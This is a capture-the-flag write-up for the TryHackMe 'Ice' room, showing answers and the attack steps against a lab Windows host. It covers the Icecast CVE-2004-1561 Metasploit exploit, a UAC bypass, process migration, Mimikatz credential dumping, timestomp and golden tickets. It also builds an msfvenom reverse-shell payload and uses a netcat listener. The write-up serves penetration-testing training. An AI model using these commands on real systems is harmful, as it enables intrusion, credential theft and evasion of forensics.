![Ice Banner](https://i.imgur.com/6Ijftag.png)

<p align="center">
   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/ice/Ice_Cover_2.png" alt="Ice Logo">
</p>

# Ice

This guide contains the answer and steps necessary to get to them for the [Ice](https://tryhackme.com/room/ice) room.

## Table of contents

- [Recon](#recon)
- [Gain Access](#gain-access)
- [Escalate](#escalate)
- [Looting](#looting)
- [Post-Exploitation](#post-exploitation)
- [Extra Credit](#extra-credit)

### Recon

In this part of the challenge we will find out more about the target and the running services.

*Launch a scan against our target machine, I recommend using a SYN scan set to scan all ports on the machine. The scan command will be provided as a hint, however, it's recommended to complete the room 'Nmap' prior to this room.*

For the scan we use the following command:

   ```cmd
   nmap -sS 10.10.190.137 -p- -sV
   ```
   
   -sS specifies the SYN scan type
   -p- means, scan all ports
   -sV gives more version information
   -sC run default scripts for more information if host name is not listed

3. Once the scan completes, we'll see a number of interesting ports open on this machine. As you might have guessed, the firewall has been disabled (with the service completely shutdown), leaving very little to protect this machine. One of the more interesting ports that is open is Microsoft Remote Desktop (MSRDP). What port is this open on?

   ![Nmap Scan](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/ice/Recon_Nmap_Scan.png)
   
   Here we find the port for the RDP service. Do some research if any services seem unclear.

   ><details><summary>Click for answer</summary>3389</details>

4. What service did nmap identify as running on port 8000? (First word of this service)

   This answer can be found in the previous image.

   ><details><summary>Click for answer</summary>Icecast</details>

5. What does Nmap identify as the hostname of the machine? (All caps for the answer)

   This can also be found in the previous image.

   ><details><summary>Click for answer</summary>DARK-PC</details>
   
### Gain Access

*Now that we've identified some interesting services running on our target machine, let's do a little bit of research into one of the weirder services identified: Icecast. Icecast, or well at least this version running on our target, is heavily flawed and has a high level vulnerability with a score of 7.5 (7.4 depending on where you view it).*
 
1. What type of vulnerability is it? Use https://www.cvedetails.com for this question and the next.

   To find this answer we need to search for icecast on the provided webpage. There we can find more information about the vulnerabiliy.
   
   ![CVE Type](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/ice/Access_CVE_Type.png)

   ><details><summary>Click for answer</summary>execute code overflow</details>

2. What is the CVE number for this vulnerability? This will be in the format: CVE-0000-0000

   This can be found on the same page as the previous question.

   ><details><summary>Click for answer</summary>CVE-2004-1561</details>

*Now that we've found our vulnerability, let's find our exploit. For this section of the room, we'll use the Metasploit module associated with this exploit. Let's go ahead and start Metasploit using the command `msfconsole`*

4. After Metasploit has started, let's search for our target exploit using the command 'search icecast'. What is the full path (starting with exploit) for the exploitation module? This module is also referenced in 'RP: Metasploit' which is recommended to be completed prior to this room, although not entirely necessary. 

   Using the command `search icecast` we can look for any modules we can use on this machine.
   
   ![MSF Modules](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/ice/Access_MSF_Module.png)

   ><details><summary>Click for answer</summary>exploit/windows/http/icecast_header</details>

*Let's go ahead and select this module for use. Type either the command `use icecast` or `use 0` to select our search result.*

5. Following selecting our module, we now have to check what options we have to set. Run the command `show options`. What is the only required setting which currently is blank?

   Now type `use exploit/windows/http/icecast_header` to select this module and the type `options` to view all options and see which we need to change.
   
   ![MSF Options](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/ice/Access_MSF_Options.png)

   ><details><summary>Click for answer</summary>rhosts</details>

*First let's check that the LHOST option is set to our tun0 IP (which can be found on the access page). With that done, let's set that last option to our target IP. Now that we have everything ready to go, let's run our exploit using the command `exploit`*

Looks like we need to change our target ip address. 

```cmd
set rhosts 10.10.190.137
```

After checking the remaining options we can type `run` or `exploit` to run the exploit.

![MSF Run Exploit](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/ice/Access_MSF_Run.png)

### Escalate

In this task we will be escalting our priveleges on the target machine.

1. Woohoo! We've gained a foothold into our victim machine! What's the name of the shell we have now?

   The name of the shell is stated in front on where we type our code.

   ><details><summary>Click for answer</summary>Meterpreter</details>

2. What user was running that Icecast process? The commands used in this question and the next few are taken directly from the 'RP: Metasploit' room.
   
   To get the user the is running the Icecast process we can use the `getuid` command.
   
   ![User ID](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/ice/Escalate_User_ID.png)

   ><details><summary>Click for answer</summary>Dark</details>

3. What build of Windows is the system?

   To get more information on the system we can use the `sysinfo` command.
   
   ![Sysinfo](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/ice/Escalate_Sys_Info.png)

   ><details><summary>Click for answer</summary>7601</details>

4. Now that we know some of the finer details of the system we are working with, let's start escalating our privileges. First, what is the architecture of the process we're running?

   This answer can be found in the previous image using the `sysinfo` command.

   ><details><summary>Click for answer</summary>x64</details>

*Now that we know the architecture of the process, let's perform some further recon. While this doesn't work the best on x64 machines, let's now run the following command `run post/multi/recon/local_exploit_suggester`. *This can appear to hang as it tests exploits and might take several minutes to complete*

5. Running the local exploit suggester will return quite a few results for potential escalation exploits. What is the full path (starting with exploit/) for the first returned exploit?

   To run the exploit suggester exploit we can search for it if you don't know the name.
   
   ```cmd
   search suggester
   ```
   
   Then we can select the correct modules with:
   
   ```cmd
   use post/multi/recon/local_exploit_suggester
   ```
   
   Type `options` to view any options we need to set. In our case the correct session number using `set session 1`.
   
   Then run the exploit using `run` or `exploit`.
   
   ![Run Suggester Module](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/ice/Escalate_Suggester.png)

   ><details><summary>Click for answer</summary>exploit/windows/local/bypassuac_eventvwr</details>

*Now that we have an exploit in mind for elevating our privileges, let's background our current session using the command `background` or `CTRL + z`. Take note of what session number we have, this will likely be 1 in this case. We can list all of our active sessions using the command `sessions` when outside of the meterpreter shell.*

*Go ahead and select our previously found local exploit for use using the command `use FULL_PATH_FOR_EXPLOIT`*

In our case we type `use exploit/windows/local/bypassuac_eventvwr`.

![Use Module](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/ice/Escalate_Use_Module.png)

*Local exploits require a session to be selected (something we can verify with the command `show options`), set this now using the command `set session SESSION_NUMBER`*

9. Now that we've set our session number, further options will be revealed in the options menu. We'll have to set one more as our listener IP isn't correct. What is the name of this option?

   To set the options we type `options` to view them.
   
   ![Set Options](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/ice/Escalate_Set_Options.png)

   ><details><summary>Click for answer</summary>LHOST</details>

*Set this option now. You might have to check your IP on the TryHackMe network using the command `ip addr`*

*After we've set this last option, we can now run our privilege escalation exploit. Run this now using the command `run`. Note, this might take a few attempts and you may need to relaunch the box and exploit the service in the case that this fails.*

Using `run` or `exploit` we can now run this module to escalate our priveleges.

![Run Module](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/ice/Escalate_Run_Module.png)

*Following completion of the privilege escalation a new session will be opened. Interact with it now using the command `sessions SESSION_NUMBER`*

In our case this wasn't necessary as we already spawned into the correct session.

13. We can now verify that we have expanded permissions using the command `getprivs`. What permission listed allows us to take ownership of files?

   Using `getprivs` in the meterpreter shell we can get a list of our priveleges.
   
   ![Priveleges](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/ice/Escalate_Run_Module.png)
   
   ><details><summary>Click for answer</summary>SeTakeOwnershipPrivilege</details>

### Looting

In this task we will gather additional information and credentials from our machine using Mimikatz.

*Prior to further action, we need to move to a process that actually has the permissions that we need to interact with the lsass service, the service responsible for authentication within Windows. First, let's list the processes using the command `ps`. Note, we can see processes being run by NT AUTHORITY\SYSTEM as we have escalated permissions (even though our process doesn't).*

2. In order to interact with lsass we need to be 'living in' a process that is the same architecture as the lsass service (x64 in the case of this machine) and a process that has the same permissions as lsass. The printer spool service happens to meet our needs perfectly for this and it'll restart if we crash it! What's the name of the printer service?

   Using `ps` in our meterpreter session we get a list of all running processes on the machine.
   
   ![Running Processes](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/ice/Looting_Processes.png)

   ><details><summary>Click for answer</summary>spoolsv.exe</details>

*Mentioned within this question is the term 'living in' a process. Often when we take over a running program we ultimately load another shared library into the program (a dll) which includes our malicious code. From this, we can spawn a new thread that hosts our shell.*

*Migrate to this process now with the command `migrate -N PROCESS_NAME`*

To migrate our procces into another process with higher priveleges (spoolsv.exe in this case) we can use the following command within MetaSploit.

```cmd
migrate -N spoolsv.exe
```

![Migrate Process](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/ice/Looting_Migrate.png)

4. Let's check what user we are now with the command `getuid`. What user is listed?

   To check if this worked we use `getuid` again to check which user we are running as now.
   
   ![Second Get Uid](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/ice/Looting_Current_User.png)

   ><details><summary>Click for answer</summary>NT AUTHORITY\SYSTEM</details>

*Now that we've made our way to full administrator permissions we'll set our sights on looting. Mimikatz is a rather infamous password dumping tool that is incredibly useful. Load it now using the command `load kiwi` (Kiwi is the updated version of Mimikatz)*

Loading the Mimkatz extension we can use `load kiwi`.

![Load Mimikatz](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/ice/Looting_Kiwi.png)

*Loading kiwi into our meterpreter session will expand our help menu, take a look at the newly added section of the help menu now via the command `help`.*

7. Which command allows up to retrieve all credentials?

   Scrolling through the help section (especially the last part with the Mimikatz commands) we can find our answer.

   ><details><summary>Click for answer</summary>creds_all</details>

8. Run this command now. What is Dark's password? Mimikatz allows us to steal this password out of memory even without the user 'Dark' logged in as there is a scheduled task that runs the Icecast as the user 'Dark'. It also helps that Windows Defender isn't running on the box ;) (Take a look again at the ps list, this box isn't in the best shape with both the firewall and defender disabled)

   Run the command with `creds_all`.
   
   ![Credentials](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/ice/Looting_Passwords.png)

   ><details><summary>Click for answer</summary>Password01</details>

### Post-Exploitation 

In this task we will look at several other commands we can use to get even more information from the target.

*Before we start our post-exploitation, let's revisit the help menu one last time in the meterpreter shell. We'll answer the following questions using that menu.*

All questions below can be found in the help section for MetaSploit.

2. What command allows us to dump all of the password hashes stored on the system? We won't crack the Administrative password in this case as it's pretty strong (this is intentional to avoid password spraying attempts)

   ><details><summary>Click for answer</summary>hashdump</details>

3. While more useful when interacting with a machine being used, what command allows us to watch the remote user's desktop in real time?

   ><details><summary>Click for answer</summary>screenshare</details>

4. How about if we wanted to record from a microphone attached to the system?

   ><details><summary>Click for answer</summary>record_mic</details>

5. To complicate forensics efforts we can modify timestamps of files on the system. What command allows us to do this? Don't ever do this on a pentest unless you're explicitly allowed to do so! This is not beneficial to the defending team as they try to breakdown the events of the pentest after the fact.

   ><details><summary>Click for answer</summary>timestomp</details>

*Mimikatz allows us to create what's called a `golden ticket`, allowing us to authenticate anywhere with ease. What command allows us to do this?*

6. Golden ticket attacks are a function within Mimikatz which abuses a component to Kerberos (the authentication system in Windows domains), the ticket-granting ticket. In short, golden ticket attacks allow us to maintain persistence and authenticate as any user on the domain.

   ><details><summary>Click for answer</summary>golden_ticket_create</details>

*One last thing to note. As we have the password for the user 'Dark' we can now authenticate to the machine and access it via remote desktop (MSRDP). As this is a workstation, we'd likely kick whatever user is signed onto it off if we connect to it, however, it's always interesting to remote into machines and view them as their users do. If this hasn't already been enabled, we can enable it via the following Metasploit module: `run post/windows/manage/enable_rdp`*

Since we have the credentials we can log into the system. We saw from the `ps` command that the RDP service has already been started. With Reminna we can remote login to the machine.

![RDP Connection](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/ice/Post_Exploit_Desktop.png)

### Extra Credit

In this optional task we can try to exploit the vulnerability manually with the code obtained from [Exploit-db](https://www.exploit-db.com/exploits/568). I never workede with exploits directly from Exploit-DB, so I was unsure how to proceed. [This](https://www.youtube.com/watch?v=eIy69zUfbgI) video provided some much needed insight. Especially, since the given exploit wouldn't work in the first place (read that somehwere else to). The updated version can be found here [https://www.exploit-db.com/exploits/573](https://www.exploit-db.com/exploits/573). 

**Update:** This version also wouldn't work, but I found another version on [Github](https://github.com/ivanitlearning/CVE-2004-1561). This also had instructions on how to compile.

1. As you advance in your pentesting skills, you will be faced eventually with exploitation without the usage of Metasploit. Provided above is the link to one of the exploits found on Exploit DB for hijacking Icecast for remote code execution. While not required by the room, it's recommended to attempt exploitation via the provided code or via another similar exploit to further hone your skills.

   After doing some research I found script that could work here. https://github.com/ivanitlearning/CVE-2004-1561
   
   The first thing we need to do after downloading the file is to modify the shellcode to suit our situation. Luckily, the author supplied us the steps to do so. LHOST should be our attack machine and LPORT the listening port.

   ```cmd
   msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.18.78.136 LPORT=443 -b '\x0a\x0d\x00' -f c
   ```
   
   ![Shellcode](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/ice/Extra_Shellcode.png)
   
   The resulting code snipper can be copied into our script.
   
   ![Script](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/ice/Extra_Script.png)
   
   Now that we have our finished script, we must compile it using `gcc`. After that, we should make the script executable with `chmod`.
   
   ```cmd
   gcc 574.c -o 575
   chmod +x 575
   ```
   
   ![Compile](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/ice/Extra_Compile.png)
   
   The last last to take before executing the script is to set up a listener on the specified port using `netcat`.
   
   ```cmd
   nc -nlvp 443
   ```
   
   Now we can run the script with the following command and wait for the incoming shell:
   
   ```cmd
   ./575 10.10.170.150
   ```
   
   ![Run Script](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/ice/Extra_Run_Script.png)
   
   ![Access](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/ice/Extra_Access.png)

I will leave the escalation part for another time. For now I feel like I have done enough. The mentioned youtube video also goes through the steps to ecsalte your priveleges.
